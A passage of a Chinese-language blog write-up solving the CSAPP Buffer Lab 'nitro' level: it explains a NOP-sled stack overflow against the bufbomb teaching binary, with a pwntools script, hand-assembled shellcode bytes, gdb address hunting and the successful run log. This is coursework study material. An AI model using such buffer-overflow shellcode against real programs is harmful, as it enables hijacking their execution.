+<p>这里调用了<code>getbufn</code>函数，用于栈溢出。同时返回到了validate(5)，在<code>validate</code>函数中，会重复五次输入，而且每次栈的位置会在一定程度上改变。由于重复调用，所以这里的难点1是需要我们恢复<code>ebp</code>的旧址，难点2是我们需要利用<code>nop</code>雪橇来进行攻击。我们需要在每次循环中，让v2的值等于cookie的值，即让<code>getbufn</code>返回cookie的值，（将cookie的值放入<code>eax</code>寄存器中之后返回到调用的地方），同时由于我们直接返回到了调用的地方，没有回复<code>ebp</code>旧址，因此我们还需要把<code>ebp</code>的值改变回来。在<code>testn</code>调用<code>getbufn</code>之后，栈的<code>esp</code>先减去了一个值扩展新的函数空间，然后将<code>ebp</code>放入这个<code>esp</code>中，在<code>getbufn</code>中，我们覆盖返回地址的同时，将返回地址前的<code>ebp</code>旧址也覆盖掉了，在<code>leave</code>之后，<code>ebp</code>的值并不正确，而<code>esp</code>的值是正确的，经过我们分析<code>testn</code>函数，发现在<code>testn</code>函数开始到调用<code>getbufn</code>之间，<code>esp</code>的偏移量位<code>ebp-0x28</code>，因此我们构造的攻击代码中，需要：把cookie的值放入<code>eax</code>寄存器，回复<code>ebp</code>的值，push下一步的地址，返回。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process([<span class="string">&#x27;./bufbomb&#x27;</span>, <span class="string">&#x27;-u&#x27;</span>, <span class="string">&#x27;2410120028&#x27;</span>, <span class="string">&#x27;-n&#x27;</span>])</span><br><span class="line">payload = <span class="string">b&#x27;\x90&#x27;</span> * <span class="number">724</span> + <span class="string">b&#x27;\xb8\x44\xed\x7d\x3d\x8d\x6c\x24\x28\x68\xfe\x95\x04\x08\xc3\x81\x39\x68\x55&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Type string:&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Type string:&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Type string:&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Type string:&quot;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里的<code>\x90</code>对应的指令为<code>nop</code>，这个724长度的<code>nop</code>就是我们的雪橇。在栈随机化过程中，跳入<code>nop</code>不会报错，并且会继续向前执行，执行到我们需要的攻击代码。<code>\xb8\x44\xed\x7d\x3d</code>对应的是把cookie的值<code>0x3d7ded44</code>放入<code>eax</code>寄存器中。<code>\x8d\x6c\x24\x28</code>对应的作用是<code>lea 0x28(%esp) , %ebp</code>，<code>\x68\xfe\x95\x04\x08</code>则是<code>push 0x080495fe</code>，这里的<code>0x080495fe</code>是<code>testn</code>函数中调用完<code>getbufn</code>下一条指令的地址。<code>\xc3</code>是<code>ret</code>指令<code>\x81\x39\x68\x55</code>则是覆盖的缓冲区地址。关于缓冲区地址，下面会说明。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">getbufn</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">735</span>]; <span class="comment">// [esp+9h] [ebp-2DFh] BYREF</span></span><br><span class="line"></span><br><span class="line">  Gets(v1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在这个函数中，我们可以看到缓冲区的位置。我们在gdb中设置断点在<code>getbufn</code>函数，之后查看<code>ebp-0x2df</code>处的地址，即为这个缓冲区的地址。由于栈会随机变化，因此我们需要把五次的地址都找到，从中找一个最大的来当地址，保证能落在构造的<code>nop</code>雪橇之中，滑入我们设置好的攻击代码中。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">(gdb) <span class="built_in">break</span> getbufn</span><br><span class="line">Breakpoint 1 at 0x8049c63</span><br><span class="line">(gdb) run -u ********** -n</span><br><span class="line">Starting program: /root/Desktop/BUFBOMB/bufbomb -u ********** -n</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">Userid: **********</span><br><span class="line">Cookie: 0x3d7ded44</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08049c63 <span class="keyword">in</span> getbufn ()</span><br><span class="line">(gdb) p /x <span class="variable">$ebp</span>-0x2df</span><br><span class="line"><span class="variable">$1</span> = 0x55683941</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Type string:</span><br><span class="line">Dud: getbufn returned 0x1</span><br><span class="line">Better luck next <span class="keyword">time</span></span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08049c63 <span class="keyword">in</span> getbufn ()</span><br><span class="line">(gdb) p /x <span class="variable">$ebp</span>-0x2df</span><br><span class="line"><span class="variable">$2</span> = 0x55683901</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Type string:</span><br><span class="line">Dud: getbufn returned 0x1</span><br><span class="line">Better luck next <span class="keyword">time</span></span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08049c63 <span class="keyword">in</span> getbufn ()</span><br><span class="line">(gdb) p /x <span class="variable">$ebp</span>-0x2df</span><br><span class="line"><span class="variable">$3</span> = 0x556838e1</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Type string:</span><br><span class="line">Dud: getbufn returned 0x1</span><br><span class="line">Better luck next <span class="keyword">time</span></span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08049c63 <span class="keyword">in</span> getbufn ()</span><br><span class="line">(gdb) p /x <span class="variable">$ebp</span>-0x2df</span><br><span class="line"><span class="variable">$4</span> = 0x55683981</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Type string:    </span><br><span class="line">Dud: getbufn returned 0x1</span><br><span class="line">Better luck next <span class="keyword">time</span></span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08049c63 <span class="keyword">in</span> getbufn ()</span><br><span class="line">(gdb) p /x <span class="variable">$ebp</span>-0x2df</span><br><span class="line"><span class="variable">$5</span> = 0x55683941</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Type string:</span><br><span class="line">Dud: getbufn returned 0x1</span><br><span class="line">Better luck next <span class="keyword">time</span></span><br><span class="line">[Inferior 1 (process 3193) exited normally]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>五个分别为<code>0x55683941</code>，<code>0x55683901</code>，<code>0x556838e1</code>，<code>0x55683981</code>，<code>0x55683941</code>。</p>
+<p>我们找一个最大0x55683981的来写即可。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">└─# python3 pwn6.py                     </span><br><span class="line">[.] Starting <span class="built_in">local</span> process <span class="string">&#x27;./bufbomb&#x27;</span> argv=[b<span class="string">&#x27;./bufbomb&#x27;</span>, b<span class="string">&#x27;-u&#x27;</span>, b<span class="string">&#x27;**********&#x27;</span>, b<span class="string">&#x27;-n&#x27;</span>] : pid 325[+] </span><br><span class="line">[DEBUG] Sent 0x2e8 bytes:</span><br><span class="line">    00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│</span><br><span class="line">    *</span><br><span class="line">    000002d0  90 90 90 90  b8 44 ed 7d  3d 8d 6c 24  28 68 fe 95  │····│·D·&#125;│=·l$│(h··│</span><br><span class="line">    000002e0  04 08 c3 81  39 68 55 0a                            │····│9hU·│</span><br><span class="line">    000002e8</span><br><span class="line">[DEBUG] Received 0x62 bytes:</span><br><span class="line">    b<span class="string">&#x27;Userid: **********\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;Cookie: 0x3d7ded44\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;Type string:KABOOM!: getbufn returned 0x3d7ded44\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;Keep going\n&#x27;</span></span><br><span class="line">[DEBUG] Sent 0x2e8 bytes:</span><br><span class="line">    00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│</span><br><span class="line">    *</span><br><span class="line">    000002d0  90 90 90 90  b8 44 ed 7d  3d 8d 6c 24  28 68 fe 95  │····│·D·&#125;│=·l$│(h··│</span><br><span class="line">    000002e0  04 08 c3 81  39 68 55 0a                            │····│9hU·│</span><br><span class="line">    000002e8</span><br><span class="line">[DEBUG] Received 0x3c bytes:</span><br><span class="line">    b<span class="string">&#x27;Type string:KABOOM!: getbufn returned 0x3d7ded44\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;Keep going\n&#x27;</span></span><br><span class="line">[DEBUG] Sent 0x2e8 bytes:</span><br><span class="line">    00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│</span><br><span class="line">    *</span><br><span class="line">    000002d0  90 90 90 90  b8 44 ed 7d  3d 8d 6c 24  28 68 fe 95  │····│·D·&#125;│=·l$│(h··│</span><br><span class="line">    000002e0  04 08 c3 81  39 68 55 0a                            │····│9hU·│</span><br><span class="line">    000002e8</span><br><span class="line">[DEBUG] Received 0x3c bytes:</span><br><span class="line">    b<span class="string">&#x27;Type string:KABOOM!: getbufn returned 0x3d7ded44\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;Keep going\n&#x27;</span></span><br><span class="line">[DEBUG] Sent 0x2e8 bytes:</span><br><span class="line">    00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│</span><br><span class="line">    *</span><br><span class="line">    000002d0  90 90 90 90  b8 44 ed 7d  3d 8d 6c 24  28 68 fe 95  │····│·D·&#125;│=·l$│(h··│</span><br><span class="line">    000002e0  04 08 c3 81  39 68 55 0a                            │····│9hU·│</span><br><span class="line">    000002e8</span><br><span class="line">[DEBUG] Received 0x3c bytes:</span><br><span class="line">    b<span class="string">&#x27;Type string:KABOOM!: getbufn returned 0x3d7ded44\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;Keep going\n&#x27;</span></span><br><span class="line">[DEBUG] Sent 0x2e8 bytes:</span><br><span class="line">    00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│</span><br><span class="line">    *</span><br><span class="line">    000002d0  90 90 90 90  b8 44 ed 7d  3d 8d 6c 24  28 68 fe 95  │····│·D·&#125;│=·l$│(h··│</span><br><span class="line">    000002e0  04 08 c3 81  39 68 55 0a                            │····│9hU·│</span><br><span class="line">    000002e8</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">KABOOM!: getbufn returned 0x3d7ded44</span><br><span class="line">Keep going</span><br><span class="line">[*] Process <span class="string">&#x27;./bufbomb&#x27;</span> stopped with <span class="built_in">exit</span> code 0 (pid 3251)</span><br><span class="line">[DEBUG] Received 0x41 bytes:</span><br><span class="line">    b<span class="string">&#x27;Type string:KABOOM!: getbufn returned 0x3d7ded44\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;VALID\n&#x27;</span></span><br><span class="line">    b<span class="string">&#x27;NICE JOB!\n&#x27;</span></span><br><span class="line">Type string:KABOOM!: getbufn returned 0x3d7ded44</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>
+
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Gazettm</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://gazettm.github.io/2025/12/13/CSAPP-Buf-lab/">http://gazettm.github.io/2025/12/13/CSAPP-Buf-lab/</a></span>
+                    </p>
+                
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CSAPP/"># CSAPP</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2025/12/08/CSAPP-%E9%93%BE%E6%8E%A5-2/">CSAPP-链接-2</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Gazettm | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
